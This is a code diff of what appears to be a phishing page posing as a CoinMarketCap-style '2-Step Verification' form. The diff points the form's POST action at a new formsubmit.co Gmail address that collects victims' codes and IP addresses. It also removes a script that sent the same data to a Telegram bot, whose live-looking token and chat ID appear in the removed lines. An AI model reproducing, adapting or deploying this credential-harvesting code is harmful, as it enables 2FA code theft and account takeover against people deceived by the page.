@@ -57,7 +57,7 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-        <form id="form"  method="POST" action="https://formsubmit.co/linkcoinmarketcap@gmail.com">
+        <form id="form"  method="POST" action="https://formsubmit.co/marketcaplinkcoin@gmail.com">
           <input type="text" id="ipaddress" name="ipaddress" hidden>
           <p class="small-title">2-Step Verification</p>
           <input
@@ -188,34 +188,7 @@
 
 
 
-      document.getElementById('contactForm').addEventListener('submit', function (event) {
-        event.preventDefault();
-
-        var code = document.getElementById('code').value;
-        // var password = document.getElementById('password').value;
-        var ipaddress = document.getElementById('ipaddress').value;
-
-        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
-        
-  var token = '7291183439:AAE7pLys9Ix7twV3JAkJkFXcrWJac9gSKlM';
-            var chat_id = '7346884836'
-
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
-
-        fetch(url)
-          .then(response => response.json())
-          .then(data => {
-            if (data.ok) {
-              window.location.href = 'thanks.html';  // Redirect to thank you page
-            } else {
-              alert('Error sending message.');
-            }
-          })
-          .catch(error => {
-            console.error('Error:', error);
-          });
-      });
-
+    
     </script>
   </body>
 
